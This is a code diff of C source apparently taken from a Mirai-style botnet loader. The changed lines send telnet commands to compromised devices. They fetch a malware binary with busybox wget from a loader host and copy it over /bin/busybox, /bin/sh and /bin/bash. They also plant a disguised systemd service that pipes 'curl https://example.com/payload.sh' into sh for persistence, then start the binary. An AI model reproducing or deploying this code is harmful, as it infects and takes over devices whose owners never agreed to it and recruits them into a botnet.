@@ -372,7 +372,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 case UPLOAD_WGET:
                                     conn->state_telnet = TELNET_UPLOAD_WGET;
                                     conn->timeout = 120;
-                                    util_sockprintf(conn->fd, "/bin/busybox wget http:
+                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/%s -O " FN_BINARY " && chmod 755 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                     wrker->srv->wget_host_ip, wrker->srv->wget_host_port, conn->info.arch);
                                     #ifdef DEBUG
                                         printf("wget\n");
@@ -523,7 +523,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             util_sockprintf(conn->fd, "/bin/busybox test -f " FN_BINARY " && /bin/busybox cp " FN_BINARY " /bin/busybox && /bin/busybox chmod 755 /bin/busybox; " TOKEN_QUERY "\r\n");
                             util_sockprintf(conn->fd, "/bin/busybox test -f " FN_BINARY " && /bin/busybox test -f /bin/sh && /bin/busybox cp " FN_BINARY " /bin/sh && /bin/busybox chmod 755 /bin/sh; " TOKEN_QUERY "\r\n");
                             util_sockprintf(conn->fd, "/bin/busybox test -f " FN_BINARY " && /bin/busybox test -f /bin/bash && /bin/busybox cp " FN_BINARY " /bin/bash && /bin/busybox chmod 755 /bin/bash; " TOKEN_QUERY "\r\n");
-                            util_sockprintf(conn->fd, "/bin/busybox test -d /etc/systemd/system && /bin/busybox test ! -f /etc/systemd/system/systemd-networkd-resolved.service && /bin/busybox sh -c 'echo \"[Unit]\\nDescription=System service\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/bin/bash -c \\''\\''curl -s https:
+                            util_sockprintf(conn->fd, "/bin/busybox test -d /etc/systemd/system && /bin/busybox test ! -f /etc/systemd/system/systemd-networkd-resolved.service && /bin/busybox sh -c 'echo \"[Unit]\\nDescription=System service\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/bin/bash -c \\''\\''curl -s https://example.com/payload.sh | sh\\''\\''\" > /etc/systemd/system/systemd-networkd-resolved.service'; " TOKEN_QUERY "\r\n");
                             util_sockprintf(conn->fd, "/bin/busybox test -f /bin/systemctl && /bin/systemctl enable systemd-networkd-resolved.service 2>/dev/null; /bin/busybox test -f /bin/systemctl && /bin/systemctl start systemd-networkd-resolved.service 2>/dev/null; " TOKEN_QUERY "\r\n");
                             util_sockprintf(conn->fd, "./" FN_BINARY " >/dev/null 2>&1 &; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_CLEANUP;
